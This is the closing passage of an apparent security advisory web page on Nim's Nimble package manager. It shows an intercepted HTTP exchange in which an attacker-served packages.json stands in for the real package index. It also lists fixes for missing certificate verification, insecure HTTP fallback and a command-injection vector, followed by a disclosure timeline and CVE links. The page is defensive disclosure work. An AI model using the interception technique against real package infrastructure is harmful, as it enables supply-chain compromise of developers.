+GET /nim-lang/packages/raw/master/packages.json HTTP/1.1
+Host: github.com
+Connection: Keep-Alive
+content-length: 0
+user-agent: Nim httpclient/1.2.4
+
+HTTP/1.1 200 OK
+Date: Sun, 18 Oct 2012 10:36:20 GMT
+Server: Apache/2.2.14 (Win32)
+Content-Length: 416
+Content-Type: application/json; charset=iso-8859-1
+Connection: Closed
+
+[
+  {
+    &#34;name&#34;: &#34;filesize&#34;,
+    &#34;url&#34;: &#34;https://github.com/sergiotapia/filesize&#34;,
+    &#34;method&#34;: &#34;git&#34;,
+    &#34;tags&#34;: [
+      &#34;filesize&#34;,
+      &#34;size&#34;
+    ],
+    &#34;description&#34;: &#34;A Nim package to convert filesizes into other units, and turns filesizes into human readable strings.&#34;,
+    &#34;license&#34;: &#34;MIT&#34;,
+    &#34;web&#34;: &#34;https://github.com/sergiotapia/filesize&#34;,
+    &#34;doc&#34;: &#34;https://github.com/sergiotapia/filesize&#34;
+  }
+]</code></pre>
+<p>The connection was intercepted delivering a potentially malicious <code>packages.json</code>.</p>
+<h2 id="proposed-fix">4 Proposed Fix</h2>
+<ul>
+<li>Certificates should always be verified by default. This is industry standard and any deviation should require the developer to consciously disable a security feature. Developer may not even expect that this feature to be disabled as many other programming languages default to secure settings.</li>
+<li>Nimble: Never downgrade/fall-back to insecure <code>http</code> requests unless explicitly requested by the user.</li>
+<li>Nimble: Add HSTS/cert pinning to increase security</li>
+<li>Nimble: Rework the <code>doCmd</code> to counter command-injection vectors</li>
+</ul>
+<h2 id="vendor-response">5 Vendor Response</h2>
+<p>Vendor response: Official Security Advisories: <a href="https://github.com/nim-lang/security/security/advisories/GHSA-c2wm-v66h-xhxx">Advisory:CVE-2021-21374</a>, <a href="https://github.com/nim-lang/security/security/advisories/GHSA-8w52-r35x-rgp8">Advisory:CVE-2021-21373</a>, <a href="https://github.com/nim-lang/security/security/advisories/GHSA-rg9f-w24h-962p">Advisory:CVE-2021-21372</a></p>
+<h3 id="timeline">5.1 Timeline</h3>
+<pre><code>JUL/09/2020 - contact nim developers @telegram; provided details, PoC
+FEB/04/2021 - deadline met. full disclosure.
+MAR/26/2021 - vendor advisories: </code></pre>
+<h2 id="references">6 References</h2>
+<ul>
+<li>[1] <a href="https://nim-lang.org/">https://nim-lang.org/</a></li>
+<li>[2] <a href="https://nim-lang.org/install.html">https://nim-lang.org/install.html</a></li>
+<li>[3] <a href="https://en.wikipedia.org/wiki/Nim_(programming_language">https://en.wikipedia.org/wiki/Nim_(programming_language</a>)</li>
+</ul>
+</div>
+</div>
+</article>
+</div>
+</main>
+<footer class="footer">
+<div class="dili-contact-block">
+<div class="dili-container">
+<div class="item-outer">
+<div class="item-logo">
+<img class="logo" data-cfsrc="/diligence/images/home/icon-ili-xs.png" alt="" style="display:none;visibility:hidden;"><noscript><img class="logo" src="/diligence/images/home/icon-ili-xs.png" alt=""></noscript>
+</div>
+<div class="item-title">
+Request a Security Review Today
+</div>
+<div class="item-description">
+Get in touch with our team to request a quote for a smart contract audit.
+</div>
+<div class="item-action">
+<a class="btn-primary" href="/diligence/contact/">Contact Us</a>
+</div>
+</div>
+</div>
+</div>
+<form action="" class="dili-newsletter-form-block">
+<div class="dili-newsletter-block">
+<div class="dili-container">
+<div class="dili-newsletter-wrapper">
+<div class="dili-menu-side">
+<div class="item-logo">
+<img class="logo" src="/diligence/images/home/icon-ili-outline-white.svg" alt="">
+</div>
+<div class="item-menu-list">
+<a class="link" href="/diligence/audits/" title="Audits">Audits</a>
+<a class="link" href="/diligence/fuzzing/" title="Fuzzing">Fuzzing</a>
+<a class="link" href="/diligence/scribble/" title="Scribble">Scribble</a>
+<a class="link" href="/diligence/blog/" title="Blog">Blog</a>
+<a class="link" href="/diligence/tools/" title="Tools">Tools</a>
+<a class="link" href="/diligence/research/" title="Research">Research</a>
+<a class="link" href="/diligence/about/" title="About">About</a>
+<a class="link" href="/diligence/contact/" title="Contact">Contact</a>
+<a class="link" target="_blank" href="https://consensys.net/open-roles/?discipline=32525" title="Careers">Careers</a>
+<a class="link" href="/diligence/privacy-policy/" title="Privacy Policy">Privacy Policy</a>
+</div>
+</div>
+<div class="dili-newsletter-form">
+<div class="newsletter-title">
+Subscribe to Our Newsletter
+</div>
+<div class="newsletter-description">
+Stay up-to-date on our latest offerings, tools, and the world of blockchain security.
+</div>
+<div class="newsletter-hubspot-wrapper">
+<script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2.js"></script>
+<script>
+                        hbspt.forms.create({
+                            portalId: "4795067",
+                            formId: "2112c777-481a-4672-8788-9fd6a239e3fe",
+                            onFormSubmitted: function () {
+                                
+                                
+                                
+                                
+                                dataLayer.push({
+                                    'event': 'newsletter_signup_form_submitted',
+                                });
+                            },
+                        });
+                        </script>
+</div>
+</div>
+</div>
+</div>
+</div>
+</form>
+<div class="dili-powered-by">
+<a href="https://consensys.net/">
+<img class="logo" src="/diligence/images/home/powered-by.svg" alt="">
+</a>
+</div>
+</footer>
+<script src="/diligence/js/jquery-3.5.1.min.js"></script>
+<script src="/diligence/js/owl.carousel.min.js"></script>
+<script src="/diligence/js/clipboard.min.js"></script>
+<script src="/diligence/js/autoload.js"></script>
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P5Z4ZWH"
+    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<script>
+      $('.expandable .expander').click(function (e) {
+        $(this).children().toggle();
+        $(this).next('.expandable-content').toggle();
+        e.preventDefault();
+      });
+    </script>
+<script>(function(){
+      var s=document.createElement('script');
+      e = !document.body ? document.querySelector('head'):document.body;
+      s.src='https://acsbapp.com/apps/app/dist/js/app.js';
+      s.defer=true;
+      s.onload=function(){
+        acsbJS.init({
+          statementLink     : '',
+          feedbackLink      : '',
+          footerHtml        : '',
+          hideMobile        : false,
+          hideTrigger       : false,
+          language          : 'en',
+          position          : 'left',
+          leadColor         : '#146ff8',
+          triggerColor      : '#2c6fdd',
+          triggerRadius     : '50%',
+          triggerPositionX  : 'left',
+          triggerPositionY  : 'bottom',
+          triggerIcon       : 'settings2',
+          triggerSize       : 'medium',
+          triggerOffsetX    : 20,
+          triggerOffsetY    : 20,
+          mobile            : {
+            triggerSize       : 'small',
+            triggerPositionX  : 'left',
+            triggerPositionY  : 'bottom',
+            triggerOffsetX    : 10,
+            triggerOffsetY    : 10,
+            triggerRadius     : '50%'
+          }
+        });
+      };
+      e.appendChild(s);}());
+    </script>
+<script type="text/javascript">(function(){window['__CF$cv$params']={r:'6a681c0ecf9561f3',m:'HvIoTp218kzqfxbQxGJGzXZN2zW2azN2An_Yi_8nfG4-1635633251-0-AfaG1tq0zImpsnmeer6YmVtKkHm+juu9NnoBCMZm5Wa+4vadmogbOH7oYDXfrrqhydVfv0MAvz3gm8DPjNhWed/Th5heTIXx46tszvQqgD0Zc+DUw1UU65gnZXw14oTnmk3eurVPM6MvGhW2yAMlxO7MKBXzvqa+7bGqF/oS0DcPXWxd4Kv6cB4bm2DLM/3DxuhX9ubOT8RcZ5sIBAT4sb8=',s:[0x68aa967900,0x2753dff6d9],}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"6a681c0ecf9561f3","token":"8d85f93baed44309addf389efbd09c5d","version":"2021.10.0","si":100}'></script>
+</body>
+</html>
